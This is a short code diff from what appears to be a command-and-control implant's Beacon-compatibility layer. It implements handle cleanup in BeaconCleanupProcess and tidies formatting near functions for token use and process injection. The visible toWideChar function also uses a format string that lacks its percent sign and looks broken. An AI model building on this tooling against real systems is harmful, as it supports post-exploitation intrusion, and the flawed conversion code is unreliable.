@@ -250,7 +250,7 @@ BOOL BeaconUseToken( HANDLE token )
     return TRUE;
 }
 
-VOID BeaconRevertToken( VOID ) 
+VOID BeaconRevertToken( VOID )
 {
     // TODO: handle this
 }
@@ -293,22 +293,26 @@ VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, in
 
 VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
 {
-    // TODO: handle this
+    NTSTATUS status;
+
+    status = Instance->Win32.NtClose(pInfo->hProcess);
+    if (status != STATUS_SUCCESS)
+        return;
+
+    status = Instance->Win32.NtClose(pInfo->hThread);
+    if (status != STATUS_SUCCESS)
+        return;
 }
 
 BOOL toWideChar( char* src, wchar_t* dst, int max )
 {
     int size = strlen(src) + 1;
     if (size > max)
-    {
         return FALSE;
-    }
 
     int result = swprintf(dst, max, L"hs", src);
     if (result == -1)
-    {
         return FALSE;
-    }
 
     return TRUE;
 }
